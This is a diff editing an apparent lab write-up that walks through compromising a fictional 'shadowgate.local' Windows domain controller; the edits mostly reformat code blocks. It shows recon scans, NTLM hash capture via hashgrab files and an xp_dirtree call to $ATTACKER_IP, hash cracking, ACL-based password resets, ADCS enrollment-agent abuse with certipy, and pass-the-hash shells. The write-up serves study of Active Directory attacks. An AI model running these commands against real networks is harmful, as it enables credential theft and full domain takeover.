@@ -39,9 +39,6 @@ A standard version/script scan against the target:
 
 ```bash
 Exegol ➜ /workspace 𝘹 nmap -sCV 10.1.104.4
-```
-
-```
 Starting Nmap 7.93 ( https://nmap.org ) at 2026-07-17 09:46 PDT
 Nmap scan report for 10.1.104.4
 Host is up (0.077s latency).
@@ -120,18 +117,10 @@ The host drops ICMP and its SSL certificates advertise `SG-DC01.shadowgate.local
 
 ```bash
 Exegol ➜ /workspace 𝘹 nxc smb 10.1.104.4 -u '' -p '' /etc/hosts --generate-hosts-file /etc/hosts
-```
-
-```
 SMB         10.1.104.4      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.1.104.4      445    SG-DC01          [+] shadowgate.local\:
-```
 
-```bash
 Exegol ➜ /workspace 𝘹 cat /etc/hosts
-```
-
-```
 127.0.0.1       localhost
 ::1     localhost ip6-localhost ip6-loopback
 fe00::  ip6-localnet
@@ -156,9 +145,6 @@ Virtual-host fuzzing against the root site — filtering out the default respons
 
 ```bash
 Exegol ➜ /workspace 𝘹 ffuf -c -w `fzf-wordlists` -H 'Host: FUZZ.shadowgate.local' -u "http://10.1.104.4/" -fs 63405
-```
-
-```
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -203,9 +189,6 @@ That single line is the whole username convention for the domain — `firstname.
 
 ```bash
 Exegol ➜ /workspace 𝘹 kerbrute userenum -d shadowgate.local --dc 10.1.104.4 /workspace/userlist2.txt
-```
-
-```
 
     __             __               __
    / /_____  _____/ /_  _______  __/ /____
@@ -239,9 +222,6 @@ With the username format in hand, content discovery against the `dev` vhost itse
 
 ```bash
 Exegol ➜ /workspace 𝘹 feroxbuster -w `fzf-wordlists` -u "http://dev.shadowgate.local" -x pdf -x js,html -x php txt json docx aspx -C 404
-```
-
-```
 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -303,9 +283,6 @@ Generate hash-grabbing files with [hashgrab](https://github.com/xct/hashgrab), p
 
 ```bash
 Exegol ➜ hashgrab at   on  main  𝘹 python3 hashgrab.py $ATTACKER_IP test
-```
-
-```
 [*] Generating hash grabbing files..
 [*] Written @test.scf
 [*] Written @test.url
@@ -333,16 +310,11 @@ The captured NetNTLMv2 hash is crackable entirely offline against a wordlist (mo
 
 ```bash
 Exegol ➜ /workspace 𝘹 hashcat -m 5600 -a 0 mitch.r `fzf-wordlists`
-```
-
-```
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 5600 (NetNTLMv2)
 Recovered........: 1/1 (100.00%) Digests (total)
-```
 
-```
 mitch.r:[REDACTED]
 ```
 
@@ -378,9 +350,6 @@ With `ForceChangePassword` over `milo.w`, set a known password without needing t
 
 ```bash
 Exegol ➜ /workspace 𝘹 bloodyAD -u 'mitch.r' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'milo.w' '[REDACTED]'
-```
-
-```
 [+] Password changed successfully!
 ```
 
@@ -391,9 +360,6 @@ Exegol ➜ /workspace 𝘹 bloodyAD -u 'mitch.r' -p '[REDACTED]' -d shadowgate.l
 ```bash
 Exegol ➜ /workspace 𝘹 owneredit.py -action write -new-owner 'milo.w' -target 'svc_mssql' \
     'shadowgate.local/milo.w:[REDACTED]' -dc-ip 10.1.104.4
-```
-
-```
 [*] Current owner information below
 [*] - SID: S-1-5-21-2396436576-3267128377-3646372360-512
 [*] - sAMAccountName: Domain Admins
@@ -405,30 +371,17 @@ Then grant `milo.w` full control via a DACL write:
 ```bash
 Exegol ➜ /workspace 𝘹 dacledit.py -action write -rights FullControl -principal 'milo.w' -target 'svc_mssql' \
     'shadowgate.local/milo.w:[REDACTED]' -dc-ip 10.1.104.4
-```
-
-```
 [*] DACL backed up to dacledit-[timestamp].bak
 [*] DACL modified successfully!
 ```
 
-Now reset `svc_mssql`'s password directly:
+Now reset `svc_mssql`'s password directly, and confirm it against the SQL Server instance:
 
 ```bash
 Exegol ➜ /workspace 𝘹 bloodyAD -u 'milo.w' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'svc_mssql' '[REDACTED]'
-```
-
-```
 [+] Password changed successfully
-```
 
-Confirm the new credential against the SQL Server instance:
-
-```bash
 Exegol ➜ /workspace 𝘹 nxc mssql 10.1.104.4 -u 'svc_mssql' -p '[REDACTED]'
-```
-
-```
 MSSQL       10.1.104.4      1433   SG-DC01          [+] shadowgate.local\svc_mssql:[REDACTED]
 ```
 
@@ -440,9 +393,6 @@ MSSQL       10.1.104.4      1433   SG-DC01          [+] shadowgate.local\svc_mss
 
 ```bash
 Exegol ➜ /workspace 𝘹 nxc mssql 10.1.104.4 -u 'svc_mssql' -p '[REDACTED]' -M mssql_priv
-```
-
-```
 MSSQL_PRIV  10.1.104.4      1433   SG-DC01          [*] SHADOWGATE\svc_mssql can impersonate: SHADOWGATE\bogdan.r
 ```
 
@@ -468,7 +418,7 @@ SQL (SHADOWGATE\bogdan.r  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
 Exegol ➜ /workspace 𝘹 responder --interface "tun0"
 ```
 
-With the listener up, coerce `bogdan.r`'s SQL Server context into authenticating to it — no user interaction required this time, just a SQL command:
+With the listener up, coerce `bogdan.r`'s SQL Server context into authenticating to it — no user interaction required this time, just a SQL command. The query itself returns nothing (the path doesn't exist), but Responder catches the coerced authentication in the background:
 
 ```sql
 SQL (SHADOWGATE\bogdan.r  guest@master)> EXEC xp_dirtree '\\$ATTACKER_IP\share'
@@ -476,8 +426,6 @@ SQL (SHADOWGATE\bogdan.r  guest@master)> EXEC xp_dirtree '\\$ATTACKER_IP\share'
 subdirectory   depth
 ------------   -----
 ```
-
-The query itself returns nothing (the path doesn't exist), but Responder catches the coerced authentication in the background:
 
 ```
 [SMB] NTLMv2-SSP Client   : 10.1.104.4
@@ -489,9 +437,6 @@ Crack it the same way as `mitch.r`'s:
 
 ```bash
 Exegol ➜ /workspace 𝘹 hashcat -m 5600 -a 0 bogdan.r `fzf-wordlists`
-```
-
-```
 bogdan.r:[REDACTED]
 ```
 
@@ -509,17 +454,9 @@ With a real password for `bogdan.r`, BloodHound shows two outbound `GenericAll` 
 
 ```bash
 Exegol ➜ /workspace 𝘹 bloodyAD -u 'bogdan.r' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'oscar.m' '[REDACTED]'
-```
-
-```
 [+] Password changed successfully!
-```
 
-```bash
 Exegol ➜ /workspace 𝘹 bloodyAD -u 'bogdan.r' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'daniel.r' '[REDACTED]'
-```
-
-```
 [+] Password changed successfully!
 ```
 
@@ -535,9 +472,6 @@ A fresh password doesn't mean a working login:
 
 ```bash
 Exegol ➜ /workspace 𝘹 nxc smb 10.1.104.4 -u 'oscar.m' -p '[REDACTED]'
-```
-
-```
 SMB         10.1.104.4      445    SG-DC01          [-] shadowgate.local\oscar.m:[REDACTED] STATUS_INVALID_LOGON_HOURS
 ```
 
@@ -547,18 +481,10 @@ Since `bogdan.r` already holds `GenericAll` over `oscar.m`, the restriction can 
 
 ```bash
 Exegol ➜ /workspace 𝘹 bloodyAD --host SG-DC01.shadowgate.local -d shadowgate.local -u bogdan.r -p '[REDACTED]' set object oscar.m logonHours
-```
-
-```
 [!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
 [+] oscar.m's logonHours has been updated
-```
 
-```bash
 Exegol ➜ /workspace 𝘹 nxc winrm 10.1.104.4 -u 'oscar.m' -p '[REDACTED]'
-```
-
-```
 WINRM       10.1.104.4      5985   SG-DC01          [+] shadowgate.local\oscar.m:[REDACTED] (admin)
 ```
 
@@ -568,9 +494,7 @@ WINRM       10.1.104.4      5985   SG-DC01          [+] shadowgate.local\oscar.m
 
 ```bash
 Exegol ➜ /workspace 𝘹 evil-winrm -u "oscar.m" -p "[REDACTED]" -i "10.1.104.4"
-```
 
-```
 Evil-WinRM shell v3.9
 
 Info: Establishing connection to remote endpoint
@@ -724,9 +648,6 @@ A deleted account isn't necessarily gone — as long as it's still inside its to
 
 ```bash
 Exegol ➜ /workspace 𝘹 bloodyAD -u oscar.m -p '[REDACTED]' -d shadowgate.local -H 10.1.104.4 get children --target "CN=Deleted Objects,DC=shadowgate,DC=local"
-```
-
-```
 distinguishedName: CN=sam.h\0ADEL:c9316c03-4a09-4d46-9db0-f45925e154f1,CN=Deleted Objects,DC=shadowgate,DC=local
 ```
 
@@ -734,9 +655,6 @@ Restore the account by name:
 
 ```bash
 Exegol ➜ /workspace 𝘹 bloodyAD -u oscar.m -p '[REDACTED]' -d shadowgate.local -H 10.1.104.4 set restore "sam.h"
-```
-
-```
 [+] sam.h has been restored successfully under CN=sam.h,CN=Users,DC=shadowgate,DC=local
 ```
 
@@ -744,17 +662,9 @@ A restored account keeps its old (unknown) password, so it needs a reset before 
 
 ```bash
 Exegol ➜ /workspace 𝘹 bloodyAD -u 'oscar.m' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'sam.h' '[REDACTED]'
-```
-
-```
 [+] Password changed successfully!
-```
 
-```bash
 Exegol ➜ /workspace 𝘹 nxc smb 10.1.104.4 -u 'sam.h' -p '[REDACTED]'
-```
-
-```
 SMB         10.1.104.4      445    SG-DC01          [+] shadowgate.local\sam.h:[REDACTED]
 ```
 
@@ -806,9 +716,6 @@ Certipy's default `req` transport is a named pipe over SMB — exactly the "RPC 
 
 ```bash
 Exegol ➜ /workspace 𝘹 certipy req -u 'sam.h@shadowgate.local' -p '[REDACTED]' -dc-ip 10.1.104.4 -ca 'Shadowgate-CA' -target SG-DC01.shadowgate.local -template 'Shadowgate-EnrollmentAgent' -dynamic-endpoint
-```
-
-```
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -831,9 +738,6 @@ Exegol ➜ /workspace 𝘹 certipy req -u 'sam.h@shadowgate.local' -p '[REDACTED
   -on-behalf-of 'shadowgate\administrator' \
   -pfx sam.h.pfx \
   -dynamic-endpoint
-```
-
-```
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -851,9 +755,6 @@ PKINIT against the resulting certificate returns Administrator's NT hash directl
 
 ```bash
 Exegol ➜ /workspace 𝘹 certipy auth -pfx 'administrator.pfx' -dc-ip 10.1.104.4
-```
-
-```
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 [*] Certificate identities:
@@ -876,9 +777,7 @@ Pass-the-hash straight into an Administrator shell:
 
 ```bash
 Exegol ➜ /workspace 𝘹 evil-winrm -u "administrator" -H "[REDACTED]" -i "10.1.104.4"
-```
 
-```
 Evil-WinRM shell v3.9
 
 Info: Establishing connection to remote endpoint
